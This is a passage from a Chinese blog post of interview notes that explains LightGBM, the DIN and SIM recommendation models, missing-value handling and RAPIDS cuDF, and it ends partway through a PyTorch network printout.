连续特征构建</h3><p>连续型特征的典型例子是用户年龄、统计类特征、物品的发布时间、影片的播放时长等数值型的特征。对于这类特征的处理，最常用的处理手段包括归一化、离散化、加非线性函数等方法。</p><p>归一化的主要目的是统一各特征的量纲，将连续特征归一化到 $[0, 1]$ 区间。也可以做 $0$ 均值归一化，即将原始数据集归一化为均值 $0$、方差 $1$ 的数据集。</p><p>离散化是通过确定分位数的形式将原来的连续值进行分桶，最终形成离散值的过程。离散化的主要目的是防止连续值带来的过拟合现象及特征值分布不均匀的情况。经过离散化处理的连续型特征和经过 ont-hot 处理的类别型特征一样，都是以特征向量的形式输入推荐模型的。</p><p>加非线性函数的处理方法，是直接把原来的特征通过非线性函数做变换，然后把原来的特征及变换后的特征一起加入模型进行训练的过程。常用的非线性函数包括 $x^a,log_a(x),log(\frac{x}{1-x})$ 等。</p><p>加非线性函数的目的是更好地捕获特征与优化目标之间的非线性关系，增强这个模型的非线性表达能力。</p><h2 id="3-3-LGB-模型"><a href="#3-3-LGB-模型" class="headerlink" title="3.3 LGB 模型"></a>3.3 LGB 模型</h2><blockquote><p>面试官：能简单介绍一下 LGB 模型吗？</p></blockquote><p>LightGBM（Light Gradient Boosting Machine）是一款基于决策树算法的分布式梯度提升框架。为了满足工业界缩短模型计算时间的需求，LightGBM 的设计思路主要是两点：</p><ol><li>减小数据对内存的使用，保证单个机器在不牺牲速度的情况下，尽可能地用上更多的数据</li><li>减小通信的代价，提升多机并行时的效率，实现在计算上的线性加速</li></ol><p>在一组实验中，LightGBM 比 XGBoost 快将近 $10$ 倍，内存占用率为 XGBoost 的 1&#x2F;6，准确略也有提升。</p><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_FLc7xisYRv.png"></p><h3 id="3-3-1-直方图算法"><a href="#3-3-1-直方图算法" class="headerlink" title="3.3.1 直方图算法"></a>3.3.1 直方图算法</h3><p>LightGBM 使用的是直方图算法（histogram algorithm），占用的内存更低，数据分割的复杂度更低。直方图算法思想是：</p><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_EH_s7m5BGz.png"></p><ul><li>将连续的浮点特征离散成 $k$ 个离散值，并构造宽度为 $k$ 的直方图。</li><li>遍历训练数据，统计每个离散值在直方图中的累计统计量。</li><li>在进行特征选择时，只需要根据直方图的离散值，遍历寻找最优的分割点。</li></ul><h4 id="3-3-1-1-内存优化"><a href="#3-3-1-1-内存优化" class="headerlink" title="3.3.1.1 内存优化"></a>3.3.1.1 内存优化</h4><p>直方图算法可以很大程度降低内存消耗，它不仅不需要额外存储预排序的结果，还可以只保存特征离散化后的值（一般用 $8$ 位整数存储就足够了）。</p><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_kVLmIbcJPK.png"></p><h4 id="3-3-1-2-计算量优化"><a href="#3-3-1-2-计算量优化" class="headerlink" title="3.3.1.2 计算量优化"></a>3.3.1.2 计算量优化</h4><p>应用直方图算法，计算代价也大幅降低，预排序算法每遍历一个特征值就需要计算一次分裂的增益，而直方图算法只需要计算 $k$ 次（$k$ 可以认为是常数），时间复杂度从 $O(\text{data}\times \text{feature})$ 直接优化到 $O(\text{k}\times \text{feature})$。</p><h4 id="3-3-1-3-注意点"><a href="#3-3-1-3-注意点" class="headerlink" title="3.3.1.3 注意点"></a>3.3.1.3 注意点</h4><p>直方图算法的理解和注意点如下：</p><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_ct1UIIasKd.png"></p><ul><li>使用分桶 bin 替代原始数据相当于增加了正则化。</li><li>使用分桶 bin 意味着很多数据的细节特征丢失，相似的数据如果划分到相同的桶中，数据之间的差异就无法捕获了。</li><li>分桶 bin 数量决定了正则化的程度，bin 越少惩罚越严重，欠拟合风险越高。</li><li>因为预先设定了 bin 的范围，构建直方图时不需要对数据进行排序。</li><li>直方图保存「划分阈值」、「当前 bin 内样本数」、「当前 bin 内所有样本的一阶梯度和」。</li><li>阈值的选取是按照直方图从小到大遍历，使用了上面的一阶梯度和，目的是得到划分之后 $\triangle l o s s$ 最大的特征及阈值。</li></ul><h4 id="3-3-1-4-算法优缺点"><a href="#3-3-1-4-算法优缺点" class="headerlink" title="3.3.1.4 算法优缺点"></a>3.3.1.4 算法优缺点</h4><p>Histogram 算法并不是完美的。由于特征被离散化后，找到的并不是很精确的分割点，所以会对结果产生影响。但在实际的数据集上表明，离散化的分裂点对最终的精度影响并不大，甚至会好一些。原因在于 decision tree 本身就是一个弱学习器，采用 Histogram 算法会起到正则化的效果，有效地防止模型的过拟合。</p><p>时间上的开销由原来的 $O(\text{data}\times \text{feature})$ 降到 $O(\text{k}\times \text{feature})$。由于离散化，$\#\text{bin}$ 远小于 $\# \text{data}$，因此时间上有很大的提升。</p><h3 id="3-3-2-树的生长策略"><a href="#3-3-2-树的生长策略" class="headerlink" title="3.3.2 树的生长策略"></a>3.3.2 树的生长策略</h3><p>直方图算法之上，LightGBM 进行进一步的优化。它没有使用大多数 GBDT 工具使用的按层生长（Level-wise）的决策树生长策略，而使用了带有深度限制的按叶子生长（Leaf-wise）算法。</p><p>$$<br>\left(p_{m}, f_{m}, v_{m}\right)&#x3D;\arg \min _{(p, f, v)} L\left(T_{m-1}(X) \cdot \operatorname{split}(p, f, v), Y\right)<br>$$</p><p>$$<br>T_{m}(X)&#x3D;T_{m-1}(X) \cdot \operatorname{split}\left(p_{m}, f_{m}, v_{m}\right)<br>$$</p><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_1fGhGJoCMB.png"></p><p>XGBoost 采用的是 Level-wise（按层生长）策略生长的，能够同时分裂同一层的叶子，从而进行多线程优化，不容易过拟合。但不加区分的对待同一层的叶子，带来了很多没必要的开销。因为实际上很多叶子的分裂增益较低，没必要进行搜索和分裂。</p><p>LightGBM 采用 Leaf-wise（按叶子生长）生长策略，每次从当前所有叶子中找到分裂增益最大（一般也是数据量最大）的一个叶子，然后分裂，如此循环。</p><p>同 Level-wise 相比，在分裂次数相同的情况下，Leaf-wise 可以降低更多的误差，得到更好的精度。Leaf-wise 的缺点是可能会长出比较深的决策树，产生过拟合。因此 LightGBM 在 Leaf-wise 之上增加了一个最大深度的限制，在保证高效率的同时防止过拟合。</p><h3 id="3-3-3-直方图差加速"><a href="#3-3-3-直方图差加速" class="headerlink" title="3.3.3 直方图差加速"></a>3.3.3 直方图差加速</h3><p>LightGBM 另一个优化是 Histogram （直方图）做差加速。整个构建过程中可以观察到：一个叶子的直方图可以由它的父亲节点的直方图与它兄弟的直方图做差得到。</p><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_idWc-mFd3J.png"></p><p>一般来说构造直方图，需要遍历该叶子上的所有数据，但直方图做差仅需遍历直方图的 $k$ 个桶。利用上述特征，LightGBM 可以在构造一个叶子的直方图后，可以用非常微小的代价得到它兄弟叶子的直方图，在速度上可以提升一倍。</p><h2 id="3-4-DIN-模型"><a href="#3-4-DIN-模型" class="headerlink" title="3.4 DIN 模型"></a>3.4 DIN 模型</h2><blockquote><p>面试官：DIN 模型是怎么做的？</p></blockquote><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_DjRG6Cy51W.png"></p><p>DIN 网络结构整体上来看是在 Embedding 层与 MLP（全连接层）之间加入了 Activation Unit。从上图能够看出，用户历史点击过的商品 id（good id）只与候选广告的商品 id 算相关性（上图中是 element-wise 减，当然你也可以算内积等，甚至可以都算），用户历史点击过的商铺 id 只与候选广告的商铺 id 算相关性。</p><p>以下模块是整个 DIN 网络的核心模块，也是该模型的创新之处，如下图所示。</p><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_elsQaBO5U0.png"></p><p>利用候选物品和用户历史行为之间的相关性计算出一个权重，这个权重就代表了“注意力”的强弱。可以看出，激活单元的输入层是 Embedding 向量，经过元素减（element-wise minus）操作后，与原 Embedding 向量一同连接后形成全连接层的输入，最后通过单神经元输出层生成注意力得分。</p><blockquote><p>面试官：LGB 模型和 DIN 模型有什么区别？</p></blockquote><ol><li>LGB 模型是一个机器学习模型，DIN 模型是一个深度学习模型；</li><li>LGB 模型的运行效率要比 DIN 好很多，它做了很多工程上的性能优化；</li><li>LGB 模型不涉及到推荐系统的领域知识，但是 DIN 模型是针对推荐的业务场景来进行设计的。</li></ol><blockquote><p>面试官：还有用过其他的模型吗？</p></blockquote><h2 id="3-5-SIM-模型"><a href="#3-5-SIM-模型" class="headerlink" title="3.5 SIM 模型"></a>3.5 SIM 模型</h2><p>为了打破短期用户数据给推荐系统带来的局限性，能够个性化地建模用户需求，精准地刻画用户偏好，引入超长的用户行为数据。从全新的视角出发提出了一个两阶段搜索范式来建模用户的超长行为序列。</p><p>算法框架如图：</p><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_kMnaDiK3I0.png"></p><p>即 Genral Search Unit（GSU）和 Exact Search Unit（ESU）。GSU 将原始的用户行为从数万降低到数百，同时还过滤掉了和候选广告信息不相关的用户行为数据。在第二阶段，ESU 利用 GSU 产出的和广告相关的用户序列数据来捕捉用户跟广告更精准的兴趣表达。通俗一点讲，这里的思路很像广告推荐系统的召回和排序模块。召回模块是负责从候选广告中筛选出尽量相关的广告送给后续的排序模块进行处理，排序模块则是在此基础上将这部分候选广告按照点击率（或者说是 ECPM）来进行排序。</p><h3 id="3-5-1-GSU-模块"><a href="#3-5-1-GSU-模块" class="headerlink" title="3.5.1 GSU 模块"></a>3.5.1 GSU 模块</h3><p>GSU 做的工作很像广告推荐系统中召回模块的作用，一般多路召回会涉及到基于规则和策略的召回链路，同时也会包含基于 Embedding 的召回链路。在论文中提到 GSU 部分就主要借鉴了这两种召回的思路，提出了两种候选行为序列检索方法，即 hard-search 和 soft-search，前者可以认为是基于规则和策略的，后者可以认为是基于 Embedding 内积相似度的：</p><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image.png"></p><p><strong>hard-search</strong></p><p>从候选行为序列中按照给定规则筛选出与当前目标任务相关的候选集，论文中指出 hard-search 方法使用的是商品类别作为筛选的标准。hard-search 是无参数的。只有和候选广告类目相同的用户行为数据才会被选出送到下一级进行建模。$C_i$ 代表了第 $i$ 个用户行为的类目，$C_a$ 代表了候选广告类目。</p><p><strong>soft-search</strong></p><p>利用一个 DNN 模型来对每个候选行为序列进行建模，离线计算得到一个 embedding，然后将候选广告 embedding 和历史行为中的 embedding 算一个内积相似度，利用近似最近邻检索方法（论文中用的是 ALSH）来得到 TopK 相关的候选行为序列。</p><p>这种方法的缺点就是计算开销比较大，不如基于规则的 hard-search 方便，优点就是效果应该会更好一些。但是论文中也提到了两种方法在效果上的差异不是特别的大，所以最后基于性能和效果的折中，采用了 hard-search 这种比较简单的方式。上式 $W_a$ 和 $W_b$ 都是模型参数。其中 $e_a$ 代表了候选广告的 embedding，$e_i$ 代表了第 $i$ 个用户行为的 embedding。然后我们采用向量检索的方式来筛选出 TopK 和广告相关的用户行为。</p><h3 id="3-5-2-ESU-模块"><a href="#3-5-2-ESU-模块" class="headerlink" title="3.5.2 ESU 模块"></a>3.5.2 ESU 模块</h3><p>ESU 部分就是对 GSU 部分生成的较短的用户行为序列进行建模计算了，可以使用之前阿里这边提出的基于 Attention 的各种深层模型对用户行为序列进行 weighted sum-pooling，更好的提升 PCTR 预估的精确度。在 ESU 中，我们可以采用类似 DIN、DIEN、MIMN 这样复杂的模型来捕捉用户和广告相关的动态兴趣表达。</p><h3 id="3-5-3-线上系统部署"><a href="#3-5-3-线上系统部署" class="headerlink" title="3.5.3 线上系统部署"></a>3.5.3 线上系统部署</h3><p>考虑到离线效果提升和在线资源开销的性价比，将 hard-search 方式的 SIM 部署到在线广告系统。对于 hard-search，用户行为可以直接按照类目进行组织并建立好离线索引，使得在线检索时间消耗非常小。因此构建了一个两级的索引来组织用户行为，取名为 User Behavior Tree（UBT）。</p><p><img src="/2024/12/08/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%99%BE%E5%BA%A6%E6%8A%80%E6%9C%AF%E4%B8%80%E9%9D%A2/image_lqptrz4CUV.png"></p><p>UBT 采用 Key-Key-Value 数据结构来进行存储：第一级 key 是用户 ID，第二级 key 是叶子行为所属的类目。并采用广告类目作为 hard-search 检索 query，经过了 GSU 模块之后，将原始用户行为长度从上万数量级降低到百级。</p><h2 id="3-6-缺失值的处理"><a href="#3-6-缺失值的处理" class="headerlink" title="3.6 缺失值的处理"></a>3.6 缺失值的处理</h2><blockquote><p>面试官：如果数据中有缺失值，该怎么处理呢？</p></blockquote><p>主要有两种做法：删除含有缺失数据的样本、对缺失值按照一定的策略进行填充。</p><h3 id="3-6-1-不处理"><a href="#3-6-1-不处理" class="headerlink" title="3.6.1 不处理"></a>3.6.1 不处理</h3><ol><li>补齐处理只是将未知值补以我们的主观估计值，不一定完全符合客观事实，在对不完备信息进行补齐处理的同时，或多或少地改变了原始的信息系统。</li><li>对空值不正确的填充往往将新的噪声引入数据中，使挖掘任务产生错误的结果。因此，在许多情况下，我们还是希望在保持原始信息不发生变化的前提下对信息系统进行处理。</li></ol><p>但是训练模型的时候，可能不处理并不能进行。所以一般不会选择不处理。</p><h3 id="3-6-2-特殊值填充"><a href="#3-6-2-特殊值填充" class="headerlink" title="3.6.2 特殊值填充"></a>3.6.2 特殊值填充</h3><p>这个是认为数据的空值也是具有一定的信息的，它之所以为空，是因为它不同于其他的任何数据。所以将空值作为一种特殊的属性值来处理，它不同于其他的任何属性值。如所有的空值都用“unknown”或 $-1$ 填充。</p><h3 id="3-6-3-平均值填充"><a href="#3-6-3-平均值填充" class="headerlink" title="3.6.3 平均值填充"></a>3.6.3 平均值填充</h3><ol><li>如果空值是数值型的，就根据该属性在其他所有对象的取值的平均值来填充该缺失的属性值</li><li>如果空值是非数值型的，就根据统计学中的众数原理，用该属性在其他所有对象的取值次数最多的值(即出现频率最高的值)来补齐该缺失的属性值。</li></ol><p>比方说，一个样本的特征 $a$ 缺失了，那么 $a$ 就填充上所有样本的特征 $a$ 的平均值。</p><p>此外有一种叫做<strong>条件平均值填充</strong>的方法，是只考虑和缺失样本具有相同特征的样本的平均值。比方说某一个样本的特征 $a$ 缺失了，用和这个样本的特征 $b$ 相同的所有样本的特征 $a$ 的平均值来填充这个缺失值。（因为这些样本和缺失数据的样本具有相同的特征，所有认为他们会更为相似）。</p><h3 id="3-6-4-热卡填充"><a href="#3-6-4-热卡填充" class="headerlink" title="3.6.4 热卡填充"></a>3.6.4 热卡填充</h3><p>对于一个包含空值的对象，热卡填充法在完整数据中找到一个与它最相似的对象，然后用这个相似对象的值来进行填充。</p><p>【优缺点】</p><ul><li>优点：该方法概念上很简单，且利用了数据间的关系来进行空值估计</li><li>缺点：在于难以定义相似标准，主观因素较多。</li></ul><h3 id="3-6-5-最近邻法"><a href="#3-6-5-最近邻法" class="headerlink" title="3.6.5 最近邻法"></a>3.6.5 最近邻法</h3><p>先根据欧式距离或相关分析来确定距离具有缺失数据样本最近的 $K$ 个样本，将这 $K$ 个值加权平均来估计该样本的缺失数据。</p><p>这个方法与热卡填充有些相似，<strong>如果最近邻法仅仅考虑最近的一个样本，那么就会退化成热卡填充</strong>。不过最近邻法和热卡填充面临同样的问题，如何衡量相似度。</p><h2 id="3-7-树模型对于缺省值的处理"><a href="#3-7-树模型对于缺省值的处理" class="headerlink" title="3.7 树模型对于缺省值的处理"></a>3.7 树模型对于缺省值的处理</h2><blockquote><p>面试官：了解过树模型是如何对缺省值进行处理的吗？</p></blockquote><h3 id="3-7-1-C4-5"><a href="#3-7-1-C4-5" class="headerlink" title="3.7.1 C4.5"></a>3.7.1 C4.5</h3><p>第一步，计算所有特征的信息增益或者信息增益率的时候，假设数据集一共 10000 个样本，特征 A 中缺失了 5000 个，则无视缺失值，在剩下的 5000 个特征中计算信息增益（或者信息增益率），最后乘以 0.5，思想就是缺失值多的特征通过这种降低权重的方式来体现信息的缺失；</p><p>第二步，如果运气不好，正好这个 A 特征乘 0.5 之后得到的信息增益或者增益率还是最大的，那么就像西瓜书中提到的那样，存在缺失值的样板按照比例进入分裂之后的新的分支，假设根据特征 A 分裂得到两个新的分支，一个分支有 2000 个样本，一个分支有 3000 个样本，则按照比例 2000 个缺失值和 3000 个缺失值样本分别进入两个分支。</p><h3 id="3-7-2-CART"><a href="#3-7-2-CART" class="headerlink" title="3.7.2 CART"></a>3.7.2 CART</h3><p>首先，如果某个存在缺失值的特征恰好是当前的分裂增益最大的特征，那么我们需要遍历剩余的特征，剩余的特征中如果有也存在缺失值的特征，那么这些特征忽略，仅仅在完全没有缺失值的特征上进行选择，选择其中能够与最佳增益的缺失特征分裂之后增益最接近的特征进行分裂。</p><p>如果事先设置了一定的标准仅仅选择仅仅选择差异性在一定范围内的特征作为代理特征进行分裂而导致了没有特征和最佳缺失特征的差异性满足要求，或者所有特征都存在缺失值的情况下，缺失样本默认进入个数最大的叶子节点。</p><p>显然这种缺失值的处理方式的计算量是非常大的，需要遍历其它的特征来进行代理特征选择，这个在数据量很大的情况下开销太大，而带来的性能提升确很有限，所以后来就不怎么用这种处理方式，</p><h3 id="3-7-3-XGBoost"><a href="#3-7-3-XGBoost" class="headerlink" title="3.7.3 XGBoost"></a>3.7.3 XGBoost</h3><p>原文中关于缺失值的处理将其看与稀疏矩阵的处理看作一样。在寻找 split point 的时候，不会对该特征为 missing 的样本进行遍历统计，只对该列特征值为 non-missing 的样本上对应的特征值进行遍历，通过这个技巧来减少了为稀疏离散特征寻找 split point 的时间开销。</p><p>在逻辑实现上，为了保证完备性，会分别处理将 missing 该特征值的样本分配到左叶子结点和右叶子结点的两种情形，计算增益后选择增益大的方向进行分裂即可。可以为缺失值或者指定的值指定分支的默认方向，这能大大提升算法的效率。如果在训练中没有缺失值而在预测中出现缺失，那么会自动将缺失值的划分方向放到右子树。</p><h2 id="3-8-RAPIDS-cuDF"><a href="#3-8-RAPIDS-cuDF" class="headerlink" title="3.8 RAPIDS cuDF"></a>3.8 RAPIDS cuDF</h2><blockquote><p>面试官：第二个比赛中的 RAPIDS cuDF 是什么？</p></blockquote><p>RAPIDS 是一个开源的 GPU 加速 Python 库套件，旨在改进数据科学和分析流程。RAPIDS cuDF 是一个 GPU DataFrame 库，提供类似于 pandas 的 API，用于加载、过滤和操作数据。只需一个命令，就可以使用 cuDF 将加速计算引入 pandas 工作流程，而无需更改代码。基于处理 5GB 数据集的分析基准测试，可以将处理速度提高 150 倍。</p><p>要将 GPU 加速引入 Jupyter Notebook 中的 pandas 工作流程，请加载 <code>cudf.pandas</code> 扩展程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%load_ext cudf.pandas</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br></pre></td></tr></table></figure><p>要在运行 Python 脚本时访问它，请使用 <code>cudf.pandas</code> 模块选项：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m cudf.pandas script.py</span><br></pre></td></tr></table></figure><blockquote><p>面试官：AlphaZero 是什么样的一个算法？</p></blockquote><p>balabala……</p><blockquote><p>面试官：博弈比赛的神经网络参数量大概有多少？</p></blockquote><ul><li>Number of parameter: 3.08M</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">total = <span class="built_in">sum</span>([param.nelement() <span class="keyword">for</span> param <span class="keyword">in</span> self.trainer.net_work.parameters()])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Number of parameter: %.2fM&quot;</span> % (total/1e6))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------</span></span><br><span class="line">NetWork(</span><br><span class="line">  (first_net): RestNet8B96C(</span><br><span class="line">    (conv): Conv2d(1, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">    (bn): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">    (relu): ReLU()</span><br><span class="line">    (residues): Sequential(</span><br><span class="line">      (0): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (1): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (2): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (3): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (4): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (5): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (6): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">      (7): ResidualBlock(</span><br><span class="line">        (conv1): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn1): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">        (relu): ReLU()</span><br><span class="line">        (conv2): Conv2d(96, 96, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1))</span><br><span class="line">        (bn2): BatchNorm2d(96, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True)</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">    (policy_head): PolicyHead(</span><br><span class="line">      (conv1): Conv2d(96, 48, kernel_size=(3, 3), 